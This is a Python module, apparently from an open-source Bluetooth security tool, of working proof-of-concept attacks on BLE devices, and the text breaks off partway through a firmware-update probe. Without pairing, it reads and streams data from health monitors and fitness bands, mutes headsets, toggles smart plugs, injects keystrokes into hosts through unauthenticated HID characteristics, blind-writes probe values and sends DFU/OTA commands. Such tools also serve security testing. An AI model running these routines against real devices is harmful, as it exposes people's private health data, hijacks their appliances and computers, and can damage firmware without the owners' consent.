"""
air-bt — PoC exploit / interaction modules for specific device classes.
Created by InnerFireZ — https://github.com/InnerFireZ/air-bt

Uses dev.services / dev.all_characteristics() (populated by enumerate_gatt)
instead of client.services — avoids "Service Discovery not performed" in bleak 3.x.

Modules:
  poc_generic_dump      - Read all open chars + subscribe all notifications
  poc_audio_device      - Audio/headset: info dump, notify stream, volume control
  poc_hid_injection     - HID keyboard injection on unauth HID devices
  poc_iot_sensor        - Sensors: temp, humidity, HR, pressure, battery
  poc_smart_plug        - Smart plugs/relays: on/off/status
  poc_fitness_tracker   - Fitness bands: steps, HR, battery, sync time
  poc_health_monitor    - Health: BP, glucose, pulse oximeter
  poc_write_probe       - Systematic write probe on all open chars
  poc_dfu_probe         - Nordic DFU / Silabs OTA / TI OAD exposure (ADV-DFU-*)
  poc_tuya_control      - Tuya BLE unauth control (ADV-TUYA-001)
  poc_govee_control     - Govee smart device control (CVE-2020-7958)
  poc_mibeacon_decode   - MiBeacon advertisement data decoder (ADV-MIBEACON-001)
  poc_sweyntooth_probe  - SweynTooth/BrakTooth GATT crash probe
  poc_hearing_aid_probe - Siemens/medical hearing aid unauth access (CVE-2019-13473/74)
  poc_blueborne_info    - BlueBorne/BleedingTooth detection report
  run_best_poc          - Auto-dispatcher based on capabilities/flags
"""

import asyncio
import logging
import struct
import time
from dataclasses import dataclass
from datetime import datetime

from bleak import BleakClient, BleakError
from bleak.exc import BleakDeviceNotFoundError
from models import BTDevice, GATTCharacteristic
from scanner.writer import WriteResult
from scanner.ble import get_cached_ble_device, clear_cached_ble_device, is_random_mac

log = logging.getLogger("air-bt.poc")


def _bleak_target(dev: BTDevice):
    """Prefer cached BLEDevice over MAC string to avoid BlueZ cache misses.

    BlueZ drops devices from its runtime cache when scanning stops.  Using the
    BLEDevice object (which holds the D-Bus object path) bypasses the cache
    lookup and keeps connections working through scanner.pause() gaps, as long
    as the device hasn't rotated its address since the last advertisement.
    """
    return get_cached_ble_device(dev.mac) or dev.mac

CONNECT_TIMEOUT = 12.0

# ── Standard GATT UUIDs ───────────────────────────────────────────────────────
U_BATTERY        = "00002a19-0000-1000-8000-00805f9b34fb"
U_TEMPERATURE    = "00002a6e-0000-1000-8000-00805f9b34fb"
U_HUMIDITY       = "00002a6f-0000-1000-8000-00805f9b34fb"
U_PRESSURE       = "00002a6d-0000-1000-8000-00805f9b34fb"
U_HEART_RATE     = "00002a37-0000-1000-8000-00805f9b34fb"
U_BODY_LOCATION  = "00002a38-0000-1000-8000-00805f9b34fb"
U_STEPS_RSC      = "00002a53-0000-1000-8000-00805f9b34fb"
U_MANUFACTURER   = "00002a29-0000-1000-8000-00805f9b34fb"
U_MODEL          = "00002a24-0000-1000-8000-00805f9b34fb"
U_FIRMWARE       = "00002a26-0000-1000-8000-00805f9b34fb"
U_SERIAL         = "00002a25-0000-1000-8000-00805f9b34fb"
U_HARDWARE       = "00002a27-0000-1000-8000-00805f9b34fb"
U_SOFTWARE       = "00002a28-0000-1000-8000-00805f9b34fb"
U_DEVICE_NAME    = "00002a00-0000-1000-8000-00805f9b34fb"
U_APPEARANCE     = "00002a01-0000-1000-8000-00805f9b34fb"
U_SYSTEM_ID      = "00002a23-0000-1000-8000-00805f9b34fb"
U_HID_REPORT     = "00002a4d-0000-1000-8000-00805f9b34fb"
U_HID_REPORT_MAP = "00002a4b-0000-1000-8000-00805f9b34fb"
U_HID_CONTROL    = "00002a4c-0000-1000-8000-00805f9b34fb"
U_BLOOD_PRESSURE = "00002a35-0000-1000-8000-00805f9b34fb"
U_PLX_SPOT       = "00002a5e-0000-1000-8000-00805f9b34fb"
U_GLUCOSE        = "00002a18-0000-1000-8000-00805f9b34fb"
U_WEIGHT         = "00002a9d-0000-1000-8000-00805f9b34fb"
U_ELEVATION      = "00002a6c-0000-1000-8000-00805f9b34fb"
U_CURRENT_TIME   = "00002a2b-0000-1000-8000-00805f9b34fb"


# ── Helpers ───────────────────────────────────────────────────────────────────

def _log(log_cb, msg: str):
    log.info(msg)
    if log_cb:
        log_cb(msg)


def _is_device_not_found(exc: Exception) -> bool:
    """
    Return True for any BlueZ 'device not found' condition regardless of how
    bleak surfaces it.

    Two distinct error paths exist:
      • BleakClient(mac_string) when device not in cache → BleakDeviceNotFoundError
      • BleakClient(BLEDevice)  when D-Bus path is stale → generic BleakError
          with message "device 'dev_XX_XX_XX_XX_XX_XX' not found"
    """
    if isinstance(exc, BleakDeviceNotFoundError):
        return True
    if isinstance(exc, BleakError) and "not found" in str(exc).lower():
        return True
    return False


def _log_connection_error(log_cb, dev: BTDevice, tag: str, exc: Exception):
    """Unified connection error handler — differentiates RPA rotation from plain cache miss."""
    if _is_device_not_found(exc):
        # Evict the stale BLEDevice from cache so the next attempt uses the MAC string.
        clear_cached_ble_device(dev.mac)
        if is_random_mac(dev.mac):
            _log(log_cb,
                 f"[{tag}] ✗ Device not found: {dev.mac}\n"
                 f"[{tag}]   This is a random/private MAC address. Likely causes:\n"
                 f"[{tag}]   1) iOS/Android rotated its address (RPA) after the last disconnect.\n"
                 f"[{tag}]   2) BlueZ evicted the cache entry while scanning was paused.\n"
                 f"[{tag}]   → Press Ctrl+C and rescan to re-discover the device.")
        else:
            _log(log_cb,
                 f"[{tag}] ✗ Device not found: {dev.mac}\n"
                 f"[{tag}]   BlueZ can no longer reach this device. Likely causes:\n"
                 f"[{tag}]   1) Device moved out of range or was powered off.\n"
                 f"[{tag}]   2) BlueZ dropped it from cache while scanning was paused.\n"
                 f"[{tag}]   → Press Ctrl+C and rescan, or move closer to the device.")
    else:
        _log(log_cb, f"[{tag}] ✗ {type(exc).__name__}: {exc}")


def _decode(data: bytes) -> str:
    """Try UTF-8 decode, strip nulls; fall back to hex."""
    try:
        s = data.decode("utf-8").strip().rstrip("\x00")
        if s and s.isprintable():
            return f'"{s}"'
    except Exception:
        pass
    if len(data) == 1:
        return str(data[0])
    return data.hex()


def _find_char(dev: BTDevice, uuid: str) -> GATTCharacteristic | None:
    """Find a characteristic in the already-enumerated dev.services."""
    uuid_l = uuid.lower()
    for c in dev.all_characteristics():
        if c.uuid.lower() == uuid_l:
            return c
    return None


def _open_chars(dev: BTDevice, prop: str) -> list[GATTCharacteristic]:
    """Return chars with a given property that are accessible without auth (no dupes)."""
    seen = set()
    out = []
    for c in dev.all_characteristics():
        if c.uuid in seen:
            continue
        if prop in c.properties:
            if prop in ("write", "write-without-response"):
                if c.writable_without_auth:
                    seen.add(c.uuid)
                    out.append(c)
            elif prop == "read":
                if c.readable_without_auth:
                    seen.add(c.uuid)
                    out.append(c)
            elif prop in ("notify", "indicate"):
                if c.notifiable_without_auth:
                    seen.add(c.uuid)
                    out.append(c)
    return out


async def _read(client: BleakClient, char: GATTCharacteristic, timeout=3.0) -> bytes | None:
    try:
        val = await asyncio.wait_for(client.read_gatt_char(char.handle), timeout=timeout)
        return bytes(val)
    except Exception:
        return None


async def _write(client: BleakClient, char: GATTCharacteristic, data: bytes, timeout=3.0) -> bool:
    try:
        resp = "write-without-response" not in char.properties
        await asyncio.wait_for(
            client.write_gatt_char(char.handle, data, response=resp),
            timeout=timeout,
        )
        return True
    except Exception:
        return False


def _make_result(dev, char_uuid, payload=b"", success=True, response=None, error=None):
    return WriteResult(
        mac=dev.mac, char_uuid=char_uuid, payload=payload,
        success=success, response=response, error=error,
    )


# ── Generic dump ──────────────────────────────────────────────────────────────

async def poc_generic_dump(dev: BTDevice, timeout=CONNECT_TIMEOUT, log_cb=None) -> list[WriteResult]:
    """Read all open readable chars + subscribe all notifiable chars."""
    results = []
    readable = _open_chars(dev, "read")
    notifiable = _open_chars(dev, "notify") + _open_chars(dev, "indicate")

    if not readable and not notifiable:
        _log(log_cb, f"[DUMP] No open readable/notifiable chars on {dev.mac}")
        return []

    _log(log_cb, f"[DUMP] {dev.mac} ({dev.name}) — {len(readable)} readable, {len(notifiable)} notifiable")

    try:
        async with BleakClient(_bleak_target(dev), timeout=timeout, pair=False) as client:
            if not client.is_connected:
                _log(log_cb, f"[DUMP] ✗ Connection failed")
                return []

            # Read all open chars
            for char in readable:
                val = await _read(client, char)
                if val is not None:
                    decoded = _decode(val)
                    _log(log_cb, f"[DUMP]   READ  {char.description or char.uuid} → {decoded}")
                    results.append(_make_result(dev, char.uuid, response=val))

            # Subscribe to all notifiable chars for 15s
            if notifiable:
                _log(log_cb, f"[DUMP]   Subscribing to {len(notifiable)} notify chars (15s) ...")

                def make_handler(c):
                    def handler(_, data):
                        decoded = _decode(bytes(data))
                        _log(log_cb, f"[DUMP]   NOTIFY {c.description or c.uuid} ← {decoded}")
                        results.append(_make_result(dev, c.uuid, response=bytes(data)))
                    return handler

                subscribed = []
                for char in notifiable:
                    try:
                        await client.start_notify(char.handle, make_handler(char))
                        subscribed.append(char)
                    except Exception as e:
                        _log(log_cb, f"[DUMP]   ✗ subscribe {char.uuid}: {e}")

                await asyncio.sleep(15.0)
                for char in subscribed:
                    try:
                        await client.stop_notify(char.handle)
                    except Exception:
                        pass

            _log(log_cb, f"[DUMP] ✓ Done — {len(results)} values captured")

    except Exception as e:
        _log_connection_error(log_cb, dev, "DUMP", e)

    return results


# ── Device info reader (shared) ───────────────────────────────────────────────

async def _read_device_info(dev: BTDevice, client: BleakClient, log_cb) -> list[WriteResult]:
    results = []
    info_map = {
        "Manufacturer":  U_MANUFACTURER,
        "Model":         U_MODEL,
        "Firmware":      U_FIRMWARE,
        "Hardware":      U_HARDWARE,
        "Software":      U_SOFTWARE,
        "Serial":        U_SERIAL,
        "System ID":     U_SYSTEM_ID,
        "Battery %":     U_BATTERY,
        "Temperature":   U_TEMPERATURE,
        "Appearance":    U_APPEARANCE,
    }
    for label, uuid in info_map.items():
        char = _find_char(dev, uuid)
        if char is None:
            continue
        val = await _read(client, char)
        if val is None:
            continue

        if label == "Battery %" and val:
            decoded = f"{val[0]}%"
            dev.battery = val[0]
        elif label == "Temperature" and len(val) >= 2:
            t = struct.unpack_from("<h", val)[0] / 100.0
            decoded = f"{t:.1f}°C"
            dev.temperature = t
        elif label == "Appearance" and len(val) >= 2:
            code = struct.unpack_from("<H", val)[0]
            decoded = f"0x{code:04X}"
        else:
            decoded = _decode(val)
            if label == "Manufacturer":
                dev.manufacturer_name = decoded.strip('"')
            elif label == "Model":
                dev.model_number = decoded.strip('"')
            elif label == "Firmware":
                dev.firmware = decoded.strip('"')

        _log(log_cb, f"   {label}: {decoded}")
        results.append(_make_result(dev, uuid, response=val))
    return results


# ── Audio device PoC ──────────────────────────────────────────────────────────

async def poc_audio_device(dev: BTDevice, timeout=CONNECT_TIMEOUT, log_cb=None) -> list[WriteResult]:
    """
    Audio/headset PoC:
      1. Dump device info (manufacturer, model, firmware, battery)
      2. Read all open characteristics
      3. Subscribe to all notifiable chars — captures volume events, playback state
      4. Attempt volume mute via writable chars
    """
    results = []
    _log(log_cb, f"[AUDIO] PoC on {dev.mac} ({dev.name})")

    try:
        async with BleakClient(_bleak_target(dev), timeout=timeout, pair=False) as client:
            if not client.is_connected:
                _log(log_cb, "[AUDIO] ✗ Connection failed")
                return []
            _log(log_cb, "[AUDIO] ✓ Connected")

            # 1. Device info
            _log(log_cb, "[AUDIO] ► Device info:")
            results += await _read_device_info(dev, client, log_cb)

            # 2. Read all open chars not already read above
            known_uuids = {U_MANUFACTURER, U_MODEL, U_FIRMWARE, U_HARDWARE,
                           U_SOFTWARE, U_SERIAL, U_SYSTEM_ID, U_BATTERY,
                           U_TEMPERATURE, U_APPEARANCE}
            _log(log_cb, "[AUDIO] ► Open readable chars:")
            for char in _open_chars(dev, "read"):
                if char.uuid.lower() in known_uuids:
                    continue
                val = await _read(client, char)
                if val:
                    _log(log_cb, f"   {char.description or char.uuid} → {_decode(val)}")
                    results.append(_make_result(dev, char.uuid, response=val))

            # 3. Subscribe all notifiable — capture live audio events
            notifiable = _open_chars(dev, "notify") + _open_chars(dev, "indicate")
            if notifiable:
                _log(log_cb, f"[AUDIO] ► Subscribing to {len(notifiable)} notify chars (10s) ...")
                notified = []

                def make_handler(c):
                    def handler(_, data):
                        decoded = _decode(bytes(data))
                        _log(log_cb, f"[AUDIO]   NOTIFY {c.description or c.uuid} ← {decoded}")
                        notified.append(_make_result(dev, c.uuid, response=bytes(data)))
                    return handler

                subscribed = []
                for char in notifiable:
                    try:
                        await client.start_notify(char.handle, make_handler(char))
                        subscribed.append(char)
                    except Exception as e:
                        _log(log_cb, f"[AUDIO]   ✗ {char.uuid}: {e}")

                await asyncio.sleep(10.0)
                results.extend(notified)
                for char in subscribed:
                    try:
                        await client.stop_notify(char.handle)
                    except Exception:
                        pass

            # 4. Try volume mute on writable chars
            _log(log_cb, "[AUDIO] ► Attempting volume control writes ...")
            for char in _open_chars(dev, "write") + _open_chars(dev, "write-without-response"):
                for label, data in [("Mute", bytes([0x06])), ("Vol=0", bytes([0x00])),
                                     ("Vol=max", bytes([0xff]))]:
                    ok = await _write(client, char, data)
                    _log(log_cb, f"[AUDIO]   WRITE {label} → {char.description or char.uuid}: {'✓' if ok else '✗'}")
                    if ok:
                        results.append(_make_result(dev, char.uuid, payload=data))
                    await asyncio.sleep(0.4)

            _log(log_cb, f"[AUDIO] ✓ Done — {len(results)} interactions")

    except Exception as e:
        _log_connection_error(log_cb, dev, "AUDIO", e)

    return results


# ── IoT Sensor PoC ────────────────────────────────────────────────────────────

async def poc_iot_sensor(dev: BTDevice, timeout=CONNECT_TIMEOUT, log_cb=None) -> list[WriteResult]:
    """
    Environmental/health sensor PoC:
      - Reads temperature, humidity, pressure, heart rate, SpO2, steps, battery
      - Subscribes to all sensor notifications for 20s (live stream)
      - Dumps all other readable values
    """
    results = []
    _log(log_cb, f"[SENSOR] PoC on {dev.mac} ({dev.name})")

    sensor_map = {
        "Temperature":  (U_TEMPERATURE,   lambda v: f"{struct.unpack_from('<h',v)[0]/100:.1f}°C" if len(v)>=2 else v.hex()),
        "Humidity":     (U_HUMIDITY,       lambda v: f"{struct.unpack_from('<H',v)[0]/100:.1f}%" if len(v)>=2 else v.hex()),
        "Pressure":     (U_PRESSURE,       lambda v: f"{struct.unpack_from('<I',v)[0]/10:.1f} Pa" if len(v)>=4 else v.hex()),
        "Heart Rate":   (U_HEART_RATE,     lambda v: f"{v[1]} bpm" if len(v)>=2 else f"{v[0]} bpm"),
        "Body Location":(U_BODY_LOCATION,  lambda v: (["Other","Chest","Wrist","Finger","Hand","Ear Lobe","Foot"][v[0]] if v and v[0] < 7 else "?") if v else "?"),
        "SpO2":         (U_PLX_SPOT,       lambda v: v.hex()),
        "Steps":        (U_STEPS_RSC,      lambda v: v.hex()),
        "Weight":       (U_WEIGHT,         lambda v: f"{struct.unpack_from('<H',v,1)[0]*0.005:.2f} kg" if len(v)>=3 else v.hex()),
        "Elevation":    (U_ELEVATION,      lambda v: f"{struct.unpack_from('<i',v)[0]*0.01:.1f} m" if len(v)>=4 else v.hex()),
        "Battery":      (U_BATTERY,        lambda v: f"{v[0]}%"),
    }

    try:
        async with BleakClient(_bleak_target(dev), timeout=timeout, pair=False) as client:
            if not client.is_connected:
                _log(log_cb, "[SENSOR] ✗ Connection failed")
                return []
            _log(log_cb, "[SENSOR] ✓ Connected")

            # Device info
            _log(log_cb, "[SENSOR] ► Device info:")
            results += await _read_device_info(dev, client, log_cb)

            # Read sensor values
            _log(log_cb, "[SENSOR] ► Sensor readings:")
            for label, (uuid, decoder) in sensor_map.items():
                char = _find_char(dev, uuid)
                if char is None:
                    continue
                val = await _read(client, char)
                if val:
                    try:
                        decoded = decoder(val)
                    except Exception:
                        decoded = val.hex()
                    _log(log_cb, f"[SENSOR]   {label}: {decoded}")
                    results.append(_make_result(dev, uuid, response=val))

            # Read all other open chars
            _log(log_cb, "[SENSOR] ► Other open chars:")
            known = {uuid for _, (uuid, _) in sensor_map.items()}
            for char in _open_chars(dev, "read"):
                if char.uuid.lower() in known:
                    continue
                val = await _read(client, char)
                if val:
                    _log(log_cb, f"[SENSOR]   {char.description or char.uuid} → {_decode(val)}")
                    results.append(_make_result(dev, char.uuid, response=val))

            # Live notification stream
            notifiable = _open_chars(dev, "notify") + _open_chars(dev, "indicate")
            if notifiable:
                _log(log_cb, f"[SENSOR] ► Live stream ({len(notifiable)} chars, 20s) ...")
                notified = []

                def make_handler(c, decoder=None):
                    def handler(_, data):
                        raw = bytes(data)
                        try:
                            v = decoder(raw) if decoder else _decode(raw)
                        except Exception:
                            v = raw.hex()
                        _log(log_cb, f"[SENSOR]   LIVE {c.description or c.uuid} ← {v}")
                        notified.append(_make_result(dev, c.uuid, response=raw))
                    return handler

                subscribed = []
                for char in notifiable:
                    uuid_l = char.uuid.lower()
                    decoder = next((d for _, (u, d) in sensor_map.items() if u == uuid_l), None)
                    try:
                        await client.start_notify(char.handle, make_handler(char, decoder))
                        subscribed.append(char)
                    except Exception as e:
                        _log(log_cb, f"[SENSOR]   ✗ {char.uuid}: {e}")

                await asyncio.sleep(20.0)
                results.extend(notified)
                for char in subscribed:
                    try:
                        await client.stop_notify(char.handle)
                    except Exception:
                        pass

            _log(log_cb, f"[SENSOR] ✓ Done — {len(results)} values captured")

    except Exception as e:
        _log_connection_error(log_cb, dev, "SENSOR", e)

    return results


# ── Smart plug / relay PoC ────────────────────────────────────────────────────

async def poc_smart_plug(dev: BTDevice, timeout=CONNECT_TIMEOUT, log_cb=None) -> list[WriteResult]:
    """
    Smart plug/relay PoC:
      - Read device info and state
      - Toggle ON → OFF → ON to demonstrate control
    """
    results = []
    _log(log_cb, f"[PLUG] PoC on {dev.mac} ({dev.name})")

    # Common commands for generic relay modules and Tuya-based plugs
    sequences = [
        # Generic relay: cc0103 / cc0104
        ("Generic ON",  bytes.fromhex("cc0103330033")),
        ("Generic OFF", bytes.fromhex("cc0104330034")),
        ("Generic ON",  bytes.fromhex("cc0103330033")),
        # Tuya style
        ("Tuya ON",     bytes.fromhex("55aa000100000001")),
        # Simple 0x01 / 0x00
        ("Simple ON",   bytes([0x01])),
        ("Simple OFF",  bytes([0x00])),
        ("Simple ON",   bytes([0x01])),
    ]

    try:
        async with BleakClient(_bleak_target(dev), timeout=timeout, pair=False) as client:
            if not client.is_connected:
                _log(log_cb, "[PLUG] ✗ Connection failed")
                return []
            _log(log_cb, "[PLUG] ✓ Connected")

            _log(log_cb, "[PLUG] ► Device info:")
            results += await _read_device_info(dev, client, log_cb)

            writable = _open_chars(dev, "write") + _open_chars(dev, "write-without-response")
            if not writable:
                _log(log_cb, "[PLUG] No open writable chars")
                return results

            _log(log_cb, f"[PLUG] ► Toggling via {len(writable)} writable chars ...")
            for char in writable[:3]:
                for label, cmd in sequences:
                    ok = await _write(client, char, cmd)
                    _log(log_cb, f"[PLUG]   {label} → {char.description or char.uuid}: {'✓' if ok else '✗'}")
                    if ok:
                        results.append(_make_result(dev, char.uuid, payload=cmd))
                    await asyncio.sleep(0.5)

            _log(log_cb, f"[PLUG] ✓ Done — {len(results)} commands sent")

    except Exception as e:
        _log_connection_error(log_cb, dev, "PLUG", e)

    return results


# ── Fitness tracker PoC ───────────────────────────────────────────────────────

async def poc_fitness_tracker(dev: BTDevice, timeout=CONNECT_TIMEOUT, log_cb=None) -> list[WriteResult]:
    """
    Fitness band PoC:
      - Read battery, steps, HR, device info
      - Try to sync time (common command on Chinese bands)
      - Subscribe HR + step notifications
    """
    results = []
    _log(log_cb, f"[FITNESS] PoC on {dev.mac} ({dev.name})")

    try:
        async with BleakClient(_bleak_target(dev), timeout=timeout, pair=False) as client:
            if not client.is_connected:
                _log(log_cb, "[FITNESS] ✗ Connection failed")
                return []
            _log(log_cb, "[FITNESS] ✓ Connected")

            _log(log_cb, "[FITNESS] ► Device info:")
            results += await _read_device_info(dev, client, log_cb)

            # Read all open chars
            _log(log_cb, "[FITNESS] ► Reading all open chars:")
            for char in _open_chars(dev, "read"):
                val = await _read(client, char)
                if val:
                    _log(log_cb, f"[FITNESS]   {char.description or char.uuid} → {_decode(val)}")
                    results.append(_make_result(dev, char.uuid, response=val))

            # Try time sync (common on ID115 clones): write current epoch to FFF3/FFF5
            epoch = int(time.time())
            time_cmd = struct.pack("<I", epoch)
            _log(log_cb, f"[FITNESS] ► Trying time sync (epoch={epoch}) ...")
            for char in _open_chars(dev, "write") + _open_chars(dev, "write-without-response"):
                ok = await _write(client, char, time_cmd)
                _log(log_cb, f"[FITNESS]   Time sync → {char.description or char.uuid}: {'✓' if ok else '✗'}")
                if ok:
                    results.append(_make_result(dev, char.uuid, payload=time_cmd))

            # HR + step notifications
            notifiable = _open_chars(dev, "notify") + _open_chars(dev, "indicate")
            if notifiable:
                _log(log_cb, f"[FITNESS] ► Live HR/step stream ({len(notifiable)} chars, 15s) ...")
                notified = []

                def make_handler(c):
                    def handler(_, data):
                        _log(log_cb, f"[FITNESS]   LIVE {c.description or c.uuid} ← {_decode(bytes(data))}")
                        notified.append(_make_result(dev, c.uuid, response=bytes(data)))
                    return handler

                subscribed = []
                for char in notifiable:
                    try:
                        await client.start_notify(char.handle, make_handler(char))
                        subscribed.append(char)
                    except Exception:
                        pass

                await asyncio.sleep(15.0)
                results.extend(notified)
                for char in subscribed:
                    try:
                        await client.stop_notify(char.handle)
                    except Exception:
                        pass

            _log(log_cb, f"[FITNESS] ✓ Done — {len(results)} interactions")

    except Exception as e:
        _log_connection_error(log_cb, dev, "FITNESS", e)

    return results


# ── Health monitor PoC ───────────────────────────────────────────────────────

async def poc_health_monitor(dev: BTDevice, timeout=CONNECT_TIMEOUT, log_cb=None) -> list[WriteResult]:
    """Read blood pressure, glucose, pulse oximeter, weight from health monitor devices."""
    results = []
    _log(log_cb, f"[HEALTH] Health monitor probe on {dev.mac} ({dev.name})")

    HEALTH_UUIDS = [
        (U_BLOOD_PRESSURE, "Blood Pressure"),
        (U_GLUCOSE,        "Glucose"),
        (U_PLX_SPOT,       "Pulse Oximeter"),
        (U_WEIGHT,         "Body Weight"),
        (U_HEART_RATE,     "Heart Rate"),
        (U_BATTERY,        "Battery"),
        (U_MANUFACTURER,   "Manufacturer"),
        (U_MODEL,          "Model"),
        (U_FIRMWARE,       "Firmware"),
    ]

    try:
        async with BleakClient(_bleak_target(dev), timeout=timeout, pair=False) as client:
            if not client.is_connected:
                _log(log_cb, "[HEALTH] ✗ Connection failed")
                return []
            _log(log_cb, "[HEALTH] ✓ Connected")

            for uuid, label in HEALTH_UUIDS:
                char = _find_char(dev, uuid)
                if char is None or not char.readable_without_auth:
                    continue
                raw = await _read(client, char)
                if raw is None:
                    continue
                decoded = _decode(raw)
                _log(log_cb, f"[HEALTH] {label}: {decoded}  (raw={raw.hex()})")
                results.append(_make_result(dev, uuid, payload=raw, success=True))

            # Subscribe to notifiable health chars for 10s
            health_notify = [c for c in dev.all_characteristics()
                             if c.notifiable_without_auth and
                             any(c.uuid == u for u, _ in HEALTH_UUIDS)]
            if health_notify:
                _log(log_cb, f"[HEALTH] Subscribing to {len(health_notify)} health notification char(s) for 10s")
                for char in health_notify:
                    try:
                        await client.start_notify(char.handle,
                            lambda _, d, u=char.uuid: _log(log_cb, f"[HEALTH NOTIFY] {u}: {bytes(d).hex()}"))
                    except Exception as e:
                        _log(log_cb, f"[HEALTH] Subscribe error {char.uuid}: {e}")
                await asyncio.sleep(10.0)
                for char in health_notify:
                    try:
                        await client.stop_notify(char.handle)
                    except Exception:
                        pass

            _log(log_cb, f"[HEALTH] ✓ Done — {len(results)} values read")

    except Exception as e:
        _log_connection_error(log_cb, dev, "HEALTH", e)

    return results


# ── HID injection PoC ─────────────────────────────────────────────────────────

async def poc_hid_injection(dev: BTDevice, text: str = "air-bt", timeout=CONNECT_TIMEOUT, log_cb=None) -> list[WriteResult]:
    """
    Unauthenticated HID keystroke injection.
    Types `text` + Enter on whatever has focus on the connected host.
    """
    results = []
    _log(log_cb, f"[HID] Injection PoC on {dev.mac} ({dev.name}) — payload: '{text}'")

    _char_to_hid = {
        'a':0x04,'b':0x05,'c':0x06,'d':0x07,'e':0x08,'f':0x09,'g':0x0a,
        'h':0x0b,'i':0x0c,'j':0x0d,'k':0x0e,'l':0x0f,'m':0x10,'n':0x11,
        'o':0x12,'p':0x13,'q':0x14,'r':0x15,'s':0x16,'t':0x17,'u':0x18,
        'v':0x19,'w':0x1a,'x':0x1b,'y':0x1c,'z':0x1d,
        '1':0x1e,'2':0x1f,'3':0x20,'4':0x21,'5':0x22,'6':0x23,
        '7':0x24,'8':0x25,'9':0x26,'0':0x27,
        ' ':0x2c,'-':0x2d,'=':0x2e,'\n':0x28,'\t':0x2b,
        '.':0x37,',':0x36,'/':0x38,';':0x33,"'":0x34,
    }
    _shift_upper = set('ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+{}|:"<>?')

    def key_report(ch):
        c = ch.lower() if ch in _shift_upper else ch
        code = _char_to_hid.get(c, 0x00)
        mod = 0x02 if ch in _shift_upper else 0x00
        return (bytes([mod, 0x00, code, 0x00, 0x00, 0x00, 0x00, 0x00]),
                bytes([0x00]*8))

    hid_char = _find_char(dev, U_HID_REPORT)
    if hid_char is None or not hid_char.writable_without_auth:
        _log(log_cb, "[HID] No writable HID Report char — searching alternatives ...")
        # Check all writable chars for HID-like UUID
        for c in _open_chars(dev, "write") + _open_chars(dev, "write-without-response"):
            if "2a4" in c.uuid.lower():
                hid_char = c
                break

    if hid_char is None:
        _log(log_cb, "[HID] ✗ No HID Report characteristic found")
        return []

    try:
        async with BleakClient(_bleak_target(dev), timeout=timeout, pair=False) as client:
            if not client.is_connected:
                _log(log_cb, "[HID] ✗ Connection failed")
                return []
            _log(log_cb, f"[HID] ✓ Connected — injecting via {hid_char.uuid}")

            for ch in text + "\n":
                down, up = key_report(ch)
                if await _write(client, hid_char, down):
                    await asyncio.sleep(0.04)
                    await _write(client, hid_char, up)
                    await asyncio.sleep(0.04)
                    _log(log_cb, f"[HID]   → '{ch}'")
                    results.append(_make_result(dev, hid_char.uuid, payload=down))

            _log(log_cb, f"[HID] ✓ Injected {len(results)} keystrokes")

    except Exception as e:
        _log_connection_error(log_cb, dev, "HID", e)

    return results


# ── Write probe ───────────────────────────────────────────────────────────────

async def poc_write_probe(dev: BTDevice, timeout=CONNECT_TIMEOUT, log_cb=None) -> list[WriteResult]:
    """Probe all writable chars with common values — reverse engineering aid."""
    results = []
    probes = [bytes([0x00]), bytes([0x01]), bytes([0xFF]),
              bytes([0x00,0x00]), bytes([0x01,0x00]), bytes([0xFF,0xFF]),
              bytes([0xAA,0x55]), bytes([0x55,0xAA]), bytes([0x00,0x00,0x00,0x00])]

    _log(log_cb, f"[PROBE] Write probe on {dev.mac} ({dev.name})")
    writable = _open_chars(dev, "write") + _open_chars(dev, "write-without-response")

    try:
        async with BleakClient(_bleak_target(dev), timeout=timeout, pair=False) as client:
            if not client.is_connected:
                _log(log_cb, "[PROBE] ✗ Connection failed")
                return []
            _log(log_cb, f"[PROBE] ✓ Connected — probing {len(writable)} chars")

            for char in writable:
                _log(log_cb, f"[PROBE] ► {char.description or char.uuid}")
                for probe in probes:
                    ok = await _write(client, char, probe)
                    _log(log_cb, f"[PROBE]   {probe.hex()} → {'✓' if ok else '✗'}")
                    if ok:
                        results.append(_make_result(dev, char.uuid, payload=probe))
                    await asyncio.sleep(0.1)

            _log(log_cb, f"[PROBE] ✓ Done — {len(results)} successful writes")

    except Exception as e:
        _log_connection_error(log_cb, dev, "PROBE", e)

    return results


# ── DFU / OTA probe (ADV-DFU-001, ADV-DFU-002, ADV-DFU-003) ─────────────────

# Nordic Semiconductor DFU bootloader
_NORDIC_DFU_SVC  = "00001530-1212-efde-1523-785feabcd123"
_NORDIC_DFU_CTRL = "00001531-1212-efde-1523-785feabcd123"  # Control Point (write+notify)
_NORDIC_DFU_PKT  = "00001532-1212-efde-1523-785feabcd123"  # Packet (write-no-resp)

# Silicon Labs Gecko Bootloader OTA
_SILABS_OTA_SVC  = "1d14d6ee-fd63-4fa1-bfa4-8f47b42119f0"
_SILABS_OTA_CTRL = "f7bf3564-fb6d-4e53-88a4-5e37e0326063"  # OTA Control (write+indicate)
_SILABS_OTA_DATA = "984227f3-34fc-4045-a5d0-2c581f81a153"  # OTA Data (write-no-resp)

# Texas Instruments OAD (Over-Air Download)
_TI_OAD_SVC    = "f000ffc0-0451-4000-b000-000000000000"
_TI_OAD_NOTIFY = "f000ffc1-0451-4000-b000-000000000000"  # Image Identify (write+notify)
_TI_OAD_BLOCK  = "f000ffc2-0451-4000-b000-000000000000"  # Image Block  (write+notify)


async def poc_dfu_probe(dev: BTDevice, timeout=CONNECT_TIMEOUT, log_cb=None) -> list[WriteResult]:
    """
    DFU/OTA exposure probe — covers ADV-DFU-001, ADV-DFU-002, ADV-DFU-003.

    Checks whether Nordic DFU, Silicon Labs Gecko OTA, or TI OAD firmware-update
    services are accessible without authentication.  For each found service:
      - Reads any readable characteristics (firmware revision / status)
      - Subscribes to notify/indicate characteristics
      - Sends a DFU Init packet (Nordic) or OTA Begin command (Silabs/TI)
        to confirm write access — a real attacker would follow up with firmware
    """
    results: list[WriteResult] = []
    _log(log_cb, f"[DFU] OTA/DFU exposure probe on {dev.mac} ({dev.name})")

    all_uuids = {s.uuid.lower() for s in dev.services}
    has_nordic = _NORDIC_DFU_SVC in all_uuids
    has_silabs = _SILABS_OTA_SVC in all_uuids
    has_ti     = _TI_OAD_SVC    in all_uuids

    if not (has_nordic or has_silabs or has_ti):
        _log(log_cb, "[DFU] ✗ No DFU/OTA service found — not a firmware-update target")
        return []

    if has_nordic: _log(log_cb, "[DFU] ✓ Nordic DFU bootloader service detected (ADV-DFU-001)")
    if has_silabs: _log(log_cb, "[DFU] ✓ Silicon Labs Gecko OTA service detected  (ADV-DFU-002)")
